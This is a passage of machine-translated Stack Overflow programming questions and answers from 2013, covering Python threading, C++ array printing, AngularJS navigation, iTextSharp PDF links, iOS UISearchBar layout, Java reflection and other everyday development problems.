            form.update("Sampe");
        }        
    } 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T06:26:22.763

试试这个：

**Class1.cs**

```
 class Class1
    {
        public Class1()
        {
            Form1._Form1.update("Sampe");
        } 
    } 
```

**Form1.cs**

```
 public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            _Form1 = this;
        }
        public static  Form1 _Form1;
        public void update(string message)
        {
            richTextBox1.AppendText("mess: " + message);
            MessageBox.Show(message);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            Class1 sample = new Class1();
        }
    } 
```

# python - 如何在python线程中运行和停止无限循环

> ID：15847717
> 
> 赞同：4
> 
> 时间：2013-04-06T06:15:18.070
> 
> 标签：python, multithreading

我需要运行一个（一系列）无限循环，该循环必须能够检查外部设置的条件以终止。我认为线程模块会允许这样做，但我迄今为止的努力都失败了。这是我正在尝试做的一个例子：

```
import threading

class Looping(object):

    def __init__(self):
     self.isRunning = True

    def runForever(self):
       while self.isRunning == True:
          "do stuff here"

l = Looping()
t = threading.Thread(target = l.runForever())
t.start()
l.isRunning = False 
```

我本来希望 t.start 在单独的线程中运行，并且 l 的属性仍然可以访问。这不是发生的事情。我在 python shell (IPython) 中尝试了上面的代码片段。t 在实例化后立即开始执行，它会阻止任何进一步的输入。很明显，我对线程模块有些不理解。关于如何解决问题的任何建议？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-06T06:17:42.463

你打电话`runForever`太早了。使用`target = l.runForever`不带括号。

一个函数调用直到它的参数被评估之后才会被评估。当您编写`runforever()`时，它会立即调用该函数，甚至在创建线程之前。通过仅传递`runForever`，您传递了函数对象本身，线程设备可以在准备好时调用它。关键是*您*实际上并不想打电话`runForever`；您只想告诉线程代码稍后应该调用`runForever`它*。*

# c++ - 使用循环显示数组时，没有任何效果

> ID：15847718
> 
> 赞同：0
> 
> 时间：2013-04-06T06:15:25.813
> 
> 标签：c++

这是我的代码

```
void printMatrix(string matrix[][NUMBER_OF_SCORES + 1], int NUMBER_OF_STUDENTS)
{
int row, col;
//this code below is to loop it so it displays all the values
/* for (row = 0; row < NUMBER_OF_STUDENTS + 1; col++)
{
   cout <<  matrix[row][col];
   cout << endl;
}
*/
int looper = 0;
// THIS IS THE FORMAT FOR DISPLAYING ONE LINE MAN

//cout << matrix[0][0];
//cout << matrix[0][1];

//this is just some test code to see if it can output certain values right
//  cout << matrix[0][0];
// cout << matrix[0][1];
// cout << matrix[0][2];
// cout << matrix[0][3];
} 
```

我已经尝试了一切。我尝试过 for 循环，也尝试过 while 循环。我不明白为什么它不起作用。它要么不显示任何内容并立即崩溃，要么只是继续向下“滚动”，就像它无限重复但不显示任何文本一样。我尝试了一个while循环，就像这样

```
int looper;
int looper = NUMBER_OF_STUDENTS;
//in this instance, NUMBER_OF_STUDENTS was equal to 28
while (looper > 0)
{
cout << matrix[looper][0];
cout << matrix[looper][1];
looper--; 
//i have tried both looper-- and --looper
} 
```

我不明白为什么它根本不起作用；这令人难以置信的沮丧。这与我正在处理的程序与[从文件读取时如何跳过数组的第一行？](https://stackoverflow.com/questions/15845518/how-do-i-skip-the-first-line-of-an-array-when-reading-from-a-file) 向你们寻求这么多帮助我感到非常内疚，但我真的要在这里抨击了。

编辑：这是我的整个代码。

```
#include <iostream>
#include <fstream>
#include <iomanip>

using namespace std;

const int NUMBER_OF_STUDENTS = 28;
const int NUMBER_OF_SCORES = 28;

void getData (ifstream& infile, string matrix[][NUMBER_OF_SCORES + 1 ],
                    int NUMBER_OF_STUDENTS) ;

void printMatrix(string matrix[][NUMBER_OF_SCORES + 1], int NUMBER_OF_STUDENTS);

int main()
{
string birdarray [NUMBER_OF_STUDENTS][NUMBER_OF_SCORES +1 ] ;
              // column 0 will hold the student ID.
              // row n has the ID and birdarray for student n.

ifstream inData; //input file stream variable
inData.open("one.txt");

if ( !inData)
{
     cout << "invalid file name \n";

     return 1;
}

// input the birdarray into two-D array birdarray
getData ( inData , birdarray, NUMBER_OF_STUDENTS );
printMatrix(birdarray, NUMBER_OF_STUDENTS);

// return  the row number of a searchItem in a particular column.
// if not found, return -1
}

void getData (ifstream& infile,string chart[][NUMBER_OF_SCORES + 1 ],
                    int student_count)

{
 int row, col;
 string dummyLine;
 getline(infile, dummyLine);
 for ( row = 0; row < student_count; row++)
    for (col =0; col <  NUMBER_OF_SCORES +1  ; col++)
        infile  >> chart [row] [col] ;

}
void printMatrix(string matrix[][NUMBER_OF_SCORES + 1], int NUMBER_OF_STUDENTS)
{
int row, col;
//this code below is to loop it so it displays all the values
/* for (row = 0; row < NUMBER_OF_STUDENTS + 1; col++)
{
   cout <<  matrix[row][col];
   cout << endl;
}
*/
int looper = 0;
// THIS IS THE FORMAT FOR DISPLAYING ONE LINE MAN

//cout << matrix[0][0];
//cout << matrix[0][1];

//this is just some test code to see if it can output certain values right
//  cout << matrix[0][0];
// cout << matrix[0][1];
// cout << matrix[0][2];
// cout << matrix[0][3];
}
//prints a labeled listing of students' scores 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:30:31.120

这是打印值表的正常方法

```
void printMatrix(string matrix[][NUMBER_OF_SCORES + 1], int NUMBER_OF_STUDENTS)
{
  for (int row = 0; row < NUMBER_OF_STUDENTS + 1; ++row)
  {
    for (int col = 0; col < NUMBER_OF_SCORES; ++col)
    {
      cout << matrix[row][col] << ' ';
    }
    cout << '\n';
  }
} 
```

**但是**我不喜欢你的代码有很多东西。所以这是否正确我不能说。我特别怀疑

1）你为什么有`NUMBER_OF_STUDENTS + 1`？没有明显的需要`+ 1`，您可能正在尝试弥补您在其他地方犯下的错误。

2）为什么你有一个字符串矩阵？分数通常是一个数字。

我想要学习的主要课程是仔细考虑**您**编写的代码的作用。代码不是神秘的魔法咒语，它是对计算机的一系列**精确**指令。如果您仔细考虑过您的代码的作用，并一步一步地遵循它，您就会看到您所犯的错误，并希望能够修复它们。你必须进入那种思维方式。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:23:33.457

到目前为止，您的尝试实际上不会打印整个矩阵，即使它们没有连续循环。首先对于 while 循环，很可能您应该将 looper 初始化为，`NUMBER_OF_STUDENTS - 1`因为如果数组中有`NUMBER_OF_STUDENTS`行，那么最高元素将是`NUMBER_OF_STUDENTS - 1`. 但是，您说的可能是`NUMBER_OF_STUDENTS + 1`其他地方的编码问题。如果是这种情况，为了简单起见，我会先尝试解决这个问题。

关于你的 for 循环

```
for (row = 0; row < NUMBER_OF_STUDENTS + 1; col++) {
   cout <<  matrix[row][col];
   cout << endl;
} 
```

这将永远循环，因为您的停止条件取决于行，但行永远不会改变，只有 col 会。

要打印矩阵中的所有元素，您需要两个循环。像这样的东西：

```
for(int row=0; row < numOfRows; row++)
    for(int col=0; col < numOfCols; col++)
         cout << matrix[row][col]; 
```

# syntax-highlighting - Sublime Text 2 中的语法高亮

> ID：15847721
> 
> 赞同：5
> 
> 时间：2013-04-06T06:15:41.597
> 
> 标签：syntax-highlighting, sublimetext2, sublimetext

所以我一直在试图弄清楚如何`typedef`在崇高的文本中为 C++ 文件中的名称添加语法突出显示。

例如，如果我`typedef long long integer;`想要`integer`突出显示（最好是与其他类型相同的颜色：`int`、`bool`等）。我查看了 C.tmLanuage 文件，并尝试将以下正则表达式代码添加`^typedef.*?\s(\w+)\s*;`到`storage.type.c`（第 49 行），但它不起作用。如果我添加 word `string`，它将突出显示单词字符串的所有实例。我尝试进入 C++.tmLanguage 文件，并将正则表达式代码添加到`storage.type.c++`，但它仍然不起作用。

有人知道如何`typedef`在崇高的文本中突出显示 's 吗？

另外，有没有办法让类名的语法突出显示？假设我声明了`string`or `vector`，我希望`string`or`vector`被突出显示。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-07T21:29:06.030

如果您有类似的内容，那么该正则表达式将起作用（我相信）`typedef foo;`为了获得您想要的行为，您必须在 tmLanguage 文件中创建一个稍微复杂的模式条目。由于语言文件是基于 TextMates 的，因此您需要将此作为参考 ( [http://manual.macromates.com/en/language_grammars#language_grammars](http://manual.macromates.com/en/language_grammars#language_grammars) )。我还建议使用[PlistJsonConverter](https://github.com/facelessuser/PlistJsonConverter)（对我来说，使用 JSON 比使用 XML 更容易）。您可能需要定义开始和结束模式（开始可能是`typedef`结束可能是`;`）。然后，您可以将所需的任何模式应用于该组。

至于类名突出显示，我会看看是否应用了任何范围。如果没有，您将不得不提出一个正则表达式来将范围应用于这些。然后，您可以添加颜色条目，或使用颜色方案中定义的颜色条目。

**编辑：**

实际上，它们似乎不是 JSON。我看到`()`而不是`[]`。JSON 很容易理解。您可以寻找更深入的内容，但[维基百科](http://en.wikipedia.org/wiki/JSON#Data_types.2C_syntax_and_example)是一个不错的起点。您可能会感兴趣的是“规则键”部分下的内容。我做了一些搜索（因为我知道那里有一些更好的例子），并遇到了[http://docs.sublimetext.info/en/latest/extensibility/syntaxdefs.html](http://docs.sublimetext.info/en/latest/extensibility/syntaxdefs.html)。它从头开始讨论语法定义，但最相关的部分可能是[http://docs.sublimetext.info/en/latest/extensibility/syntaxdefs.html#analyzing-patterns](http://docs.sublimetext.info/en/latest/extensibility/syntaxdefs.html#analyzing-patterns). 我没有用于查找类名的正则表达式，因此您必须自己想出一个。如果您还没有，您可能需要四处搜索以查看其他人是否以适合您的方式实现了语言文件。

您将需要从内置的 tmLanguage 文件开始，并将其从 Plist 转换为 json。然后，您可以编辑该文件并将其移回。

# javascript - 有没有一种简单的方法来使用按钮来导航页面，就像 angularjs 中的链接一样

> ID：15847726
> 
> 赞同：47
> 
> 时间：2013-04-06T06:16:27.630
> 
> 标签：javascript, angularjs

在angularjs中，我想这样使用`button`，但我仍然需要按钮查找。

```
<button href="#/new-page.html">New Page<button> 
```

正如`a`（链接）所做的那样

```
<a href="#/new-page.html">New Page</a> 
```

还有比这更简单的方法吗？

```
<button ng-click="newPage()">New Page<button>
$scope.newPage = function (){
    location.href = '#/new-page.html';
}; 
```

注意：实际上，当我习惯`location.href`导航时，整体刷新并且导航不受angularjs的控制。如果我不使用链接，如何在 javascript 代码中导航页面？

我是否需要创建一个自定义指令来实现它？

* * *

## 回答 #1

> 赞同：66
> 
> 时间：2013-04-06T07:14:42.073

你`ngClick`是正确的；您只需要正确的服务。[`$location`](http://docs.angularjs.org/api/ng.$location)就是你要找的。查看文档以获取完整的详细信息，但您的具体问题的解决方案是：

```
$location.path( '/new-page.html' ); 
```

`$location`如果根据您当前的设置合适，该服务将添加哈希 (#)，并确保不会发生页面重新加载。

如果您这样选择，您还可以使用指令做一些更灵活的事情：

```
.directive( 'goClick', function ( $location ) {
  return function ( scope, element, attrs ) {
    var path;

    attrs.$observe( 'goClick', function (val) {
      path = val;
    });

    element.bind( 'click', function () {
      scope.$apply( function () {
        $location.path( path );
      });
    });
  };
}); 
```

然后你可以在任何东西上使用它：

```
<button go-click="/go/to/this">Click!</button> 
```

有很多方法可以改进这个指令；它只是为了展示可以做什么。这是一个 Plunker 演示它的实际操作：[http](http://plnkr.co/edit/870E3psx7NhsvJ4mNcd2?p=preview) ://plnkr.co/edit/870E3psx7NhsvJ4mNcd2?p=preview 。

* * *

## 回答 #2

> 赞同：26
> 
> 时间：2015-01-26T12:43:15.100

使用引导程序，您可以使用

```
<a href="#/new-page.html" class="btn btn-primary">
    Click
</a> 
```

* * *

## 回答 #3

> 赞同：20
> 
> 时间：2014-03-26T22:08:04.067

如果你对乱扔标记没意见，你可以用简单的方法做到这一点，只需`<button>`用锚 ( `<a>`) 链接包装你的标记。

```
<a href="#/new-page.html"><button>New Page<button></a> 
```

此外，没有什么可以阻止您将锚链接设置为看起来像`<button>`

* * *

*正如@tronman 的评论所指出的，[这在技术上不是有效的 html5](https://stackoverflow.com/questions/6393827)，但在实践中它不应该引起任何问题*

* * *

## 回答 #4

> 赞同：10
> 
> 时间：2014-10-31T14:25:51.717

您还可以在控制器的范围内注册 $location（以使其可以从 html 访问）

```
angular.module(...).controller("...", function($location) {
  $scope.$location = $location;
  ...
}); 
```

然后直接在你的 html 中寻找蜂蜜：

```
<button ng-click="$location.path('#/new-page.html')">New Page<button> 
```

* * *

## 回答 #5

> 赞同：9
> 
> 时间：2014-08-20T14:01:08.860

```
 <a type="button" href="#/new-page.html" class="btn btn-lg btn-success" >New Page</a> 
```

**简单的...**

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2016-12-02T11:55:10.910

对我来说，最好的解决方案是使用带有**ui-sref 的**Angular 路由器原生指令，例如：

```
<button ui-sref="state.name">Go!!</button> 
```

要了解该指令并获得更多选项，请访问 ui-router 文档：

[https://ui-router.github.io/docs/0.3.1/#/api/ui.router.state.directive:ui-sref](https://ui-router.github.io/docs/0.3.1/#/api/ui.router.state.directive:ui-sref)

:)

* * *

## 回答 #7

> 赞同：-1
> 
> 时间：2016-09-26T10:16:07.903

```
<button type="button" href="location.href='#/nameOfState'">Title on button</button> 
```

更简单...（注意地址周围的单引号）

# c# - 以 pdf 格式导入命名目的地

> ID：15847730
> 
> 赞同：2
> 
> 时间：2013-04-06T06:16:52.803
> 
> 标签：c#, pdf, itextsharp

我正在开发一个应用程序，其中将 word 文档转换为 pdf 格式。我的问题太复杂了，请帮帮我。

我的 word doc 有目录、书签、尾注和超链接。当我将此文档另存为 pdf 时，只会转换书签。经过长时间的研究，我发现 PDF 文档不支持书签到书签超链接，它需要页码或命名目的地。

因此，我为此目的选择了命名目的地，但我又被卡住了，因为简单的`"save as`“无法在 pdf doc 中生成命名目的地。所以我在 adobe PDF 打印机上打印了 word doc，并根据需要获得了命名目的地，但同样，这个文档也没有里面有书签也没有超链接所以我决定从一个单词生成两个pdf，第一个是另存为选项，第二个是打印。

1.  test.pdf（另存为）（包含书签、超链接）
2.  test_p.pdf（通过打印）（仅包含命名目的地）

然后我再次研究并找到了一种方法，可以`test_p.pdf`通过 itextsharp 的函数将所有命名的目的地从 XML 中提取出来。但不幸的是，我没有任何方法可以将其导入回来……这`xml`就是`test.pdf`我来这里的原因。

如果这种方法可以，请指导我下一步该怎么做。否则向我建议任何其他方法来完成这项任务。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T07:42:26.230

前段时间我写了一个类来替换我的 PDF 文件中的 url：

```
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using iTextSharp.text.pdf;

namespace ReplaceLinks
{
    public class ReplacePdfLinks
    {
        Dictionary<string, PdfObject> _namedDestinations;
        PdfReader _reader;

        public string InputPdf { set; get; }
        public string OutputPdf { set; get; }
        public Func<Uri, string> UriToNamedDestination { set; get; }

        public void Start()
        {
            updatePdfLinks();
            saveChanges();
        }

        private PdfArray getAnnotationsOfCurrentPage(int pageNumber)
        {
            var pageDictionary = _reader.GetPageN(pageNumber);
            var annotations = pageDictionary.GetAsArray(PdfName.ANNOTS);
            return annotations;
        }

        private static bool hasAction(PdfDictionary annotationDictionary)
        {
            return annotationDictionary.Get(PdfName.SUBTYPE).Equals(PdfName.LINK);
        }

        private static bool isUriAction(PdfDictionary annotationAction)
        {
            return annotationAction.Get(PdfName.S).Equals(PdfName.URI);
        }

        private void replaceUriWithLocalDestination(PdfDictionary annotationAction)
        {
            var uri = annotationAction.Get(PdfName.URI) as PdfString;
            if (uri == null)
                return;

            if (string.IsNullOrWhiteSpace(uri.ToString()))
                return;

            var namedDestination = UriToNamedDestination(new Uri(uri.ToString()));
            if (string.IsNullOrWhiteSpace(namedDestination))
                return;

            PdfObject entry;
            if (!_namedDestinations.TryGetValue(namedDestination, out entry))
                return;

            annotationAction.Remove(PdfName.S);
            annotationAction.Remove(PdfName.URI);

            var newLocalDestination = new PdfArray();
            annotationAction.Put(PdfName.S, PdfName.GOTO);
            var xRef = ((PdfArray)entry).First(x => x is PdfIndirectReference);
            newLocalDestination.Add(xRef);
            newLocalDestination.Add(PdfName.FITH);
            annotationAction.Put(PdfName.D, newLocalDestination);
        }

        private void saveChanges()
        {
            using (var fileStream = new FileStream(OutputPdf, FileMode.Create, FileAccess.Write, FileShare.None))
            using (var stamper = new PdfStamper(_reader, fileStream))
            {
                stamper.Close();
            }
        }

        private void updatePdfLinks()
        {
            _reader = new PdfReader(InputPdf);
            _namedDestinations = _reader.GetNamedDestinationFromStrings();

            var pageCount = _reader.NumberOfPages;
            for (var i = 1; i <= pageCount; i++)
            {
                var annotations = getAnnotationsOfCurrentPage(i);
                if (annotations == null || !annotations.Any())
                    continue;

                foreach (var annotation in annotations.ArrayList)
                {
                    var annotationDictionary = (PdfDictionary)PdfReader.GetPdfObject(annotation);

                    if (!hasAction(annotationDictionary))
                        continue;

                    var annotationAction = annotationDictionary.Get(PdfName.A) as PdfDictionary;
                    if (annotationAction == null)
                        continue;

                    if (!isUriAction(annotationAction))
                        continue;

                    replaceUriWithLocalDestination(annotationAction);
                }
            }
        }
    }    
} 
```

要使用它：

```
 new ReplacePdfLinks
    {
        InputPdf = @"test.pdf",
        OutputPdf = "mod.pdf",
        UriToNamedDestination = uri =>
        {
            if (uri.Host.ToLowerInvariant().Contains("google.com"))
            {
                return "entry1";
            }

            return string.Empty;
        }
    }.Start(); 
```

此示例将修改所有包含 google.com 的 url，以指向特定的命名目的地“entry1”。这是测试上述类的示例文件：

```
void WriteFile()
{
    using (var doc = new Document(PageSize.LETTER))
    {
        using (var fs = new FileStream("test.pdf", FileMode.Create))
        {
            using (var writer = PdfWriter.GetInstance(doc, fs))
            {
                doc.Open();
                var blueFont = FontFactory.GetFont("Arial", 12, Font.NORMAL, BaseColor.BLUE);
                doc.Add(new Chunk("Go to URL", blueFont).SetAction(new PdfAction("http://www.google.com/", false)));

                doc.NewPage();
                doc.Add(new Chunk("Go to Test", blueFont).SetLocalGoto("entry1"));

                doc.NewPage();
                doc.Add(new Chunk("Test").SetLocalDestination("entry1"));

                doc.Close();
            }
        }
    }
} 
```

# iphone - ios 从 NSURLRequest 获取标头我收到错误 [NSConcreteMutableData allHeaderFields]: unrecognized selector

> ID：15847737
> 
> 赞同：0
> 
> 时间：2013-04-06T06:17:49.757
> 
> 标签：iphone, ios, nsurlrequest, nshttpurlresponse

我正在尝试使用以下行获取 NSURLRequest 的标头：

```
NSString *contentType = [[(NSHTTPURLResponse *)data allHeaderFields] valueForKey:@"Content-Type"]; 
```

但我收到以下错误：

```
-[NSConcreteMutableData allHeaderFields]: unrecognized selector sent to instance 0x8d876e0
 *** Terminating app due to uncaught exception 'NSInvalidArgumentException', reason: '-[NSConcreteMutableData allHeaderFields]: unrecognized selector sent to instance 0x8d876e0' 
```

任何人都知道为什么会出现此错误，或者我该如何修复或我做错了什么？

我会非常感谢你的帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T06:28:05.023

`data`是一个`NSData`实例，而不是`NSHTTURLResponse`你想的那样。

这就是为什么它无法识别`allHeaderFields`您发送给它的选择器。

# actionscript-3 - 错误：在冒号之前需要右括号

> ID：15847740
> 
> 赞同：0
> 
> 时间：2013-04-06T06:18:19.643
> 
> 标签：actionscript-3, flash

我正在编写一个动作脚本，我似乎无法在这个代码块上找到问题。
请帮忙。

部分代码：

```
 private function constructCommunicatorAndConnect() : void
    {
        var cHost:* = ExternalData.splashServerHosts[this.m_nSplashServerIndex];
        var nPort:* = int(ExternalData.splashServerPorts[this.m_nSplashServerIndex]);
        var cSocket:* = new ReconnectingStringSocket(cHost, nPort, new RandomXORScrambler(68, 47));
        cSocket.addEventListener(ReconnectingStringSocket.RECONNECTING, function (event:Event) : void
        {
            MultiplayerContainer.addTextToConsole("Lost splash connection, trying to reconnect...");
            return;
        }// end function
        );
        cSocket.addEventListener(ReconnectingStringSocket.RECONNECTING_SUCCESSFUL, function (event:Event) : void
        {
            MultiplayerContainer.addTextToConsole("Splash connection succesfully reestablished");
            return;
        }// end function
        );
        this.m_cSplashCommunicator = new SplashCommunicator(cSocket, MultiplayerContainer.player.com.miniclip.multiplayer.container.player:ILocalPlayer::sessionID, MultiplayerContainer.player.userID, ExternalData.gameID, this);
        this.m_cSplashCommunicator.connect();
        MultiplayerContainer.addTextToConsole("Connecting to splash server #" + this.m_nSplashServerIndex + " (" + cHost + ":" + nPort + ") with session \"" + MultiplayerContainer.player.sessionID + "\"");
        dispatchEvent(new Event(COMMUNICATOR_CONSTRUCTED));
        return;
    }// end function 
```

错误在

```
this.m_cSplashCommunicator = new SplashCommunicator(cSocket, MultiplayerContainer.player.com.miniclip.multiplayer.container.player:ILocalPlayer::sessionID, MultiplayerContainer.player.userID, ExternalData.gameID, this); 
```

一些相关功能：

```
public function SplashCommunicator(param1:StringSocket_i, param2:String, param3:String, param4:String, param5:ISplashListener)
    {
        super(param1, param5);
        param1.setSocketEventHandler(this.handleSocketEvent);
        param1.addEventListener(Event.CONNECT, this.socketConnected);
        this.m_cSessionID = param2 != null ? (param2) : ("");
        this.m_cUserID = param3 != null ? (param3) : ("");
        this.m_cGameID = param4;
        this.m_cListener = param5;
        return;
    }// end function 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-07T06:39:37.843

这是你的问题，检查你的代码

```
 .player:ILocalPlayer::sessionID, Multiplaye // check these ::
      whatever = new whatever(somemorestuff,hi{in here is where you have ::::::::::},outside); 
```

请参阅上述模式，冒号位于括号内 (MC{x:200,y:200}); 我希望你关注我

# jquery - 如何在grails中安装jquery插件

> ID：15847742
> 
> 赞同：0
> 
> 时间：2013-04-06T06:18:49.070
> 
> 标签：jquery, grails, intellij-idea

我想在我的项目中使用 jquery。这就是为什么我试图通过 intellij 的以下命令安装它 >>>

```
install-plugin jquery 
```

当命令运行时，它会给出以下消息>>>

```
Failed to install plugin [jquery-1.7.1]. Plugin has missing JAR dependencies. 
```

我不知道如何解决它。谁能帮我解决这个问题。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:42:12.917

您可以将插件添加到构建配置中，而不是使用 install-plugin。所以在你的构建配置中应该有一个 plugins 闭包只是更新，所以它看起来类似于以下内容（不要删除任何已经存在的插件）。

```
plugins {
    runtime ":jquery:1.8.3"
} 
```

# iphone - UISearchBar中的右对齐放大镜图标

> ID：15847745
> 
> 赞同：7
> 
> 时间：2013-04-06T06:18:59.983
> 
> 标签：iphone, ios, cocoa-touch, uikit, uisearchbar

在 Cocoa-Touch 中，我们找到了一个 control `UISearchBar`。我需要对其进行自定义，以便文本字段中的搜索图标（我们单击它执行相应的操作）**右对齐**。通常我们会发现它是**左对齐**的。有可能这样做吗？做过研发，但没找到...

我该怎么做？有什么好的教程可以找到吗？

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2013-04-06T06:55:38.550

不幸的`UISearchBar`是，它并不是为了直接支持这一点而设计的。在完成我们想要的事情时，我们可能不得不使用在视觉或功能方面妥协的变通方法，或者编写大量自定义代码。

我已经概述了一些接近我们想要并且可能有用的方法。

## 访问子视图方法

a 中的文本`UISearchBar`是`UITextField`a 的子视图，`UISearchBar`可以通过通常的方式访问，即`view.subviews`.

放大镜搜索图标`UIImageView`是[`leftView`](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITextField_Class/Reference/UITextField.html#//apple_ref/occ/instp/UITextField/leftView). `UITextField`我们可以使用以下代码将其切换到右侧：

```
// The text within a UISearchView is a UITextField that is a subview of that UISearchView.
UITextField *searchField;
for (UIView *subview in self.searchBar.subviews)
{
    if ([subview isKindOfClass:[UITextField class]]) {
        searchField = (UITextField *)subview;
        break;
    }
}

// The icon is accessible through the 'leftView' property of the UITextField.
// We set it to the 'rightView' instead.
if (searchField)
{
    UIView *searchIcon = searchField.leftView;
    if ([searchIcon isKindOfClass:[UIImageView class]]) {
        NSLog(@"aye");
    }
    searchField.rightView = searchIcon;
    searchField.leftViewMode = UITextFieldViewModeNever;
    searchField.rightViewMode = UITextFieldViewModeAlways;
} 
```

这给了我们以下结果：

![搜索栏 1](https://i.stack.imgur.com/Pf0ii.png)

如您所见，图标超出了圆角矩形的边缘，并且清除图标已经消失。此外，该[`rightView`](http://developer.apple.com/library/ios/#documentation/uikit/reference/UITextField_Class/Reference/UITextField.html#//apple_ref/occ/instp/UITextField/rightView)属性还用于其他内容，例如搜索结果按钮和书签按钮。即使您能够使用偏移的填充来适当地定位它，将搜索图标放在此处也可能会以某种方式与此功能发生冲突。

至少，您可以使用这种方法将图标提取为 a`UIImageView`并将其显式放置在您认为合适的位置，就像任何其他视图一样，并编写自定义代码来处理点击事件等。

## 自定义外观方法

在**iOS v5.0及更高版本中，您可以使用**[此处](http://developer.apple.com/library/ios/#documentation/uikit/reference/UISearchBar_Class/Reference/Reference.html#//apple_ref/doc/uid/TP40007529-CH3-SW53)列出的方法自定义搜索栏的外观。以下代码使用偏移量在 中定位图标和文本`UISearchBar`：

```
[self.searchBar setPositionAdjustment:UIOffsetMake(255, 0) forSearchBarIcon:UISearchBarIconSearch];
[self.searchBar setSearchTextPositionAdjustment:UIOffsetMake(-270, 0)]; 
```

在 320 宽度的标准`UISearchBar`上，它看起来如下所示：

![搜索栏 2](https://i.stack.imgur.com/Busxj.png)

这将使与图标相关的所有事件功能按预期工作，但不幸的`UITextField`是，尽管它的宽度很混乱，但它只显示其文本的一小部分。如果你能找到一种方法让文本显示超出它认为的结尾`UITextField`，这可能是你最好的选择。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2016-03-30T00:17:52.277

我的要求是搜索图标应该在右侧，并且只要 X 图标出现，它就应该隐藏起来。

我想出了与上面类似的解决方案，但有点不同，并且还使用了 Swift 2 和 AutoLayout。基本思想是隐藏左侧视图，用放大镜图像创建一个新视图，并使用自动布局将其固定到右侧。然后在搜索栏文本不为空时使用 UISearchBarDelegate 方法隐藏搜索图标。

```
class CustomSearchView: UIView {
  //the magnifying glass we will put on the right
  lazy var magnifyingGlass = UIImageView()
  @IBOutlet weak var searchBar: UISearchBar!

  func commonInit() {
    searchBar.delegate = self
    searchBar.becomeFirstResponder()

    //find the search bar object inside the subview stack
    if let searchField = self.searchBar.subviews.firstObject?.subviews.filter(
        {($0 as? UITextField) != nil }).firstObject as? UITextField {
        //hides the left magnifying glass icon
        searchField.leftViewMode = .Never
        //add a magnifying glass image to the right image view.  this can be anything, but we are just using the system default
        //from the old left view
        magnifyingGlass.image = (searchField.leftView! as? UIImageView)?.image
        //add the new view to the stack
        searchField.addSubview(magnifyingGlass)

        //use autolayout constraints to pin the view to the right
        let views =  ["view": magnifyingGlass]
        magnifyingGlass.translatesAutoresizingMaskIntoConstraints = false
        searchField.addConstraints(NSLayoutConstraint.constraintsWithVisualFormat(
            "H:[view(12)]-|", options: [], metrics: nil, views: views))
        searchField.addConstraints(NSLayoutConstraint.constraintsWithVisualFormat(
            "V:[view]-|", options: [], metrics: nil, views: views))
    }
  }
  //hides whenever text is not empty
  func searchBar(searchBar: UISearchBar, textDidChange searchText: String) {
    magnifyingGlass.hidden = searchText != ""
  } 
 } 
```

# apache-flex - 从键盘以及程序员在flex4中制作的键盘在当前光标位置的文本区域中插入文本？

> ID：15847749
> 
> 赞同：2
> 
> 时间：2013-04-06T06:19:22.390
> 
> 标签：apache-flex, flex4, flex4.6

我正在尝试在当前光标位置插入文本。我可以通过键盘在当前光标位置插入文本，但**无法通过程序员制作的键盘插入文本**。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-23T05:05:15.750

```
 var pos:int = taMain.selectionActivePosition;

            if (pos != -1)
            {
                taMain.text = taMain.text.substr(0, pos) + str + taMain.text.substr(pos, taMain.text.length - pos);
                taMain.selectRange(pos + str.length, pos + str.length);
            }
        }
    ]]>
</fx:Script> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-09T08:20:27.003

嗨试试下面的代码： -

```
protected function greekalpha_clickHandler(event:MouseEvent):void {     
                if(FlexGlobals.topLevelApplication.textTarget.visible) { 
                    FlexGlobals.topLevelApplication.textTarget.setFocus(); 
                    FlexGlobals.topLevelApplication.textTarget.insertText((event.target as Button).label); 
                } 
            } 
```

# java - 从java中的数组中读取元素

> ID：15847750
> 
> 赞同：0
> 
> 时间：2013-04-06T06:19:32.517
> 
> 标签：java, arrays

我有一个 Object 类的实例（例如 obj）。

通过使用`obj.getClass().isArray()`我可以确认它是一个数组。

现在我想访问这个数组的元素（比如`obj[0]`或类似的东西）。有可能这样做吗？

请帮忙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T06:22:09.310

只需将其转换为`Object`数组。

```
(Object[])obj[0]; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T06:24:07.333

检查下面的代码：

```
Object array = new String[]{"abc","def"};
    if(array.getClass().isArray()){
        Object[] aaa = (Object[])array;
        System.out.println(aaa[0]);
    } 
```

任何非原始数组都可以向上转换为`Object[]`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T06:28:35.150

`java.lang.reflect.Array`提供动态访问数组元素的方法。您可以使用`Array.get(Object array, int index)`来读取元素并`Array.getLength(Object array)`获取其长度。

# c# - 使用 SilverLight 从 SQL Server 2008 建立连接并检索数据

> ID：15847758
> 
> 赞同：1
> 
> 时间：2013-04-06T06:21:09.243
> 
> 标签：c#, asp.net, web-services, silverlight

我是 Silverlight 世界的新手。我阅读了许多文章来使用 Silverlight 与 SQL Server 建立连接，但很遗憾没有人给我具体的结果。我想先与 SQL Server 数据库建立连接，然后在组合框中简单地加载数据。任何人都可以给出任何合理的逐步示例来与 Silverlight 项目建立联系。我发现 WCF 服务对建立连接很有帮助，但很难映射该服务。还请建议使用 WCF 的任何其他 Web 服务，谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T07:22:42.763

当您查看 Silverlight 架构时，您会发现“.NET for Silverlight”运行时不包含任何直接访问数据库的类：

